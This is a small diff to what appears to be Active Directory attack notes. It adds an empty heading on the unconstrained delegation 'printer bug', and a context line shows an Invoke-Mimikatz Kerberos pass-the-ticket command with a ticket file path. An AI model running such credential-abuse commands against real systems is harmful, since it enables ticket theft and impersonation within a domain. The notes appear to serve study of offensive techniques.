@@ -254,3 +254,6 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2c
 ```
 
 
+# **Unconstrained Delegation - Printer Bug**
+
+
